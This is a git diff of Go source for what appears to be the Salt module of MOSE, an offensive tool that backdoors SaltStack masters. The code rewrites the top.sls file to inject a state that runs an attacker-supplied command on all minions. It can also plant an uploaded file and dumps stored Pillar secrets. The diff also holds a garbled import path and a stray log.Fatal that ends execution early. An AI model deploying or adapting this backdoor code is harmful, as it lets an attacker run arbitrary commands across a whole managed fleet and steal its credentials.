@@ -15,10 +15,9 @@ import (
 	"strings"
 	"text/template"
 
-	"github.com/fatih/color"
 	"github.com/gobuffalo/packr/v2"
 	utils "github.com/l50/goutils"
-	"github.com/master-of-serversmsonK1ng/mose/pkg/moseutils"
+	"github.com/master-of-servers/mose/pkg/moseutils"
 )
 
 type command struct {
@@ -28,21 +27,17 @@ type command struct {
 }
 
 var (
-	a                = CreateAgent()
+	a              = CreateAgent()
+	cleanup        bool
+	cleanupFile    = a.CleanupFile
 	cmd            = a.Cmd
-	debug            = a.Debug
-	localIP          = a.LocalIP
-	osTarget         = a.OsTarget
-	saltState        = a.PayloadName
-	uploadFileName   = a.FileName
-	suppliedFilename string
-	keys             []string
-	inspect          bool
-	uploadFilePath   = a.RemoteUploadFilePath
-	cleanup          bool
-	cleanupFile      = a.CleanupFile
-	saltBackupLoc    = a.SaltBackupLoc
-	specific         bool
+	debug          = a.Debug
+	osTarget       = a.OsTarget
+	saltStateName  = a.PayloadName
+	uploadFileName = a.FileName
+	uploadFilePath = a.RemoteUploadFilePath
+	saltBackupLoc  = a.SaltBackupLoc
+	specific       bool
 )
 
 func init() {
@@ -51,19 +46,20 @@ func init() {
 	flag.Parse()
 }
 
-func getExistingTopFiles() []string {
-	var topLocs []string
+//func getExistingTopFiles() []string {
+func getTopFile() string {
+	var topLoc string
 	fileList, _ := moseutils.GetFileAndDirList([]string{"/srv"})
 	for _, file := range fileList {
 		if strings.Contains(file, "top.sls") && !strings.Contains(file, "~") &&
-			!strings.Contains(file, ".bak") && !strings.Contains(file, "#") {
-			topLocs = append(topLocs, file)
+			!strings.Contains(file, ".bak") && !strings.Contains(file, "#") && !strings.Contains(file, "pillar") {
+			topLoc = file
 		}
 	}
-	if len(topLocs) == 0 {
+	if topLoc == "" {
 		log.Fatalln("Unable to locate a top file to backdoor, exiting.")
 	}
-	return topLocs
+	return topLoc
 }
 
 func backdoorSiteSpecific(topLoc string) {
@@ -91,7 +87,7 @@ func backdoorSiteSpecific(topLoc string) {
 			log.Fatal("Quitting ...")
 		}
 		if ans {
-			newContent += lineReg.ReplaceAllString(line, "$1$2\n$1- "+saltState)
+			newContent += lineReg.ReplaceAllString(line, "$1$2\n$1- "+saltStateName)
 		} else {
 			newContent += line + "\n"
 		}
@@ -119,7 +115,7 @@ func backdoorSite(topLoc string) {
 
 	found := groupLastItem.MatchString(content)
 	if found {
-		insertState := "$1$2\n$1 " + saltState
+		insertState := "$1$2\n$1 " + saltStateName
 		content = fmt.Sprint(groupLastItem.ReplaceAllString(content, insertState))
 		err = ioutil.WriteFile(topLoc, []byte(content), 0644)
 		if err != nil {
@@ -138,14 +134,14 @@ func getTopLoc(topLoc string) string {
 
 func createState(topLoc string, cmd string) {
 	topLocPath := getTopLoc(topLoc)
-	stateFolderLoc := filepath.Join(topLocPath, saltState)
+	stateFolderLoc := filepath.Join(topLocPath, saltStateName)
 	stateFolders := []string{stateFolderLoc}
 
-	stateFilePath := filepath.Join(topLocPath, saltState, saltState+".sls")
+	stateFilePath := filepath.Join(topLocPath, saltStateName, saltStateName+".sls")
 
-	if moseutils.CreateFolders(stateFolders) && generateState(stateFilePath, cmd, saltState) {
-		msg("Successfully created the %s state at %s", saltState, stateFilePath)
-		msg("Adding folder %s to cleanup file", stateFolderLoc)
+	if moseutils.CreateFolders(stateFolders) && generateState(stateFilePath, cmd, saltStateName) {
+		moseutils.Msg("Successfully created the %s state at %s", saltStateName, stateFilePath)
+		moseutils.Msg("Adding folder %s to cleanup file", stateFolderLoc)
 		// Track the folders for clean up purposes
 		moseutils.TrackChanges(cleanupFile, stateFolderLoc)
 		if uploadFileName != "" {
@@ -160,20 +156,20 @@ func createState(topLoc string, cmd string) {
 			log.Printf("Successfully copied and chmod file %s", filepath.Join(saltFileFolders, filepath.Base(uploadFileName)))
 		}
 	} else {
-		log.Fatalf("Failed to create %s state", saltState)
+		log.Fatalf("Failed to create %s state", saltStateName)
 	}
 }
 
 func generateState(stateFile string, cmd string, stateName string) bool {
 	saltCommands := command{
-		Cmd:       bdCmd,
+		Cmd:       cmd,
 		FileName:  uploadFileName,
 		StateName: stateName,
 	}
 
 	box := packr.New("Salt", "../../../templates/salt")
 
-	s, err := box.FindString("saltState.tmpl")
+	s, err := box.FindString("saltStateName.tmpl")
 	if uploadFileName != "" {
 		s, err = box.FindString("saltFileUploadState.tmpl")
 	}
@@ -182,7 +178,7 @@ func generateState(stateFile string, cmd string, stateName string) bool {
 		log.Fatal("Parse: ", err)
 	}
 
-	t, err := template.New("saltState").Parse(s)
+	t, err := template.New("saltStateName").Parse(s)
 
 	if err != nil {
 		log.Fatal("Parse: ", err)
@@ -212,7 +208,7 @@ func getPillarSecrets(binLoc string) {
 		log.Printf("Error running command: %s '*' pillar.items", binLoc)
 		log.Fatal(err)
 	}
-	msg("%s", res)
+	moseutils.Msg("%s", res)
 
 	return
 }
@@ -265,10 +261,13 @@ func backupSite(siteLoc string) {
 func main() {
 	// If we're not root, we probably can't backdoor any of the salt code, so exit
 	utils.CheckRoot()
+	// Get the existing top.sls file
+	topLoc := getTopFile()
+	log.Fatal(topLoc)
 
-	// get existing top files
-	topLocs := getExistingTopFiles()
-	log.Fatal(topLocs)
+	if cleanup {
+		doCleanup(topLoc)
+	}
 
 	if uploadFilePath != "" {
 		moseutils.TrackChanges(cleanupFile, uploadFilePath)
@@ -278,7 +277,7 @@ func main() {
 	if !found {
 		log.Fatalf("salt binary not found, exiting...")
 	}
-	found, topLoc := moseutils.FindFile("top.sls", []string{"/srv/salt"})
+	//found, topLoc := moseutils.FindFile("top.sls", []string{"/srv/salt"})
 	if !found {
 		log.Fatalf("top.sls not found, exiting...")
 	}
@@ -288,12 +287,12 @@ func main() {
 	}
 
 	backupSite(topLoc)
-	msg("Backdooring the %s top.sls to run %s on all minions, please wait...", topLoc, bdCmd)
+	moseutils.Msg("Backdooring the %s top.sls to run %s on all minions, please wait...", topLoc, cmd)
 	if specific {
 		backdoorSiteSpecific(topLoc)
 	}
 	backdoorSite(topLoc)
-	createState(topLoc, bdCmd)
+	createState(topLoc, cmd)
 
 	log.Println("Attempting to find secrets stored with salt Pillars")
 	getPillarSecrets(strings.TrimSpace(binLoc))
